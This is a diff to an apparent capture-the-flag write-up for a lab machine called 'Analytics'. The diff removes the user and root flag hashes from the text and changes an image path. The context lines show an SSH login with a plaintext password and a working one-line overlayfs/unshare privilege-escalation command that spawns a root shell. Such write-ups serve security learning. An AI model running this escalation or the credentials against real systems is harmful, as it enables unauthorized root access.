@@ -74,7 +74,7 @@ Lets log-in via SSH
 ssh metalytics@10.10.11.233
 Password: An4lytics_ds20223#
 
-cat user.txt                   # 50a6c93abfd7c2293045a2980ebc6617
+cat user.txt
 ```
 
 While reviewing the results of `linpeas` again, it was discovered that the machine's version was Ubuntu 22.04.3
@@ -89,10 +89,10 @@ Executing the code
 unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")'
 ```
 
-![1059](Pasted%20image%2020260820103105.png)
+![1059](/assets/img/posts/Pasted%20image%2020260820103105.png)
 
 Searching for the root flag
 ```
 root@analytics:~# cd /root
-cat root.txt                 # 3e60c3f42dca352a5990682c2f73579f
+cat root.txt
 ```
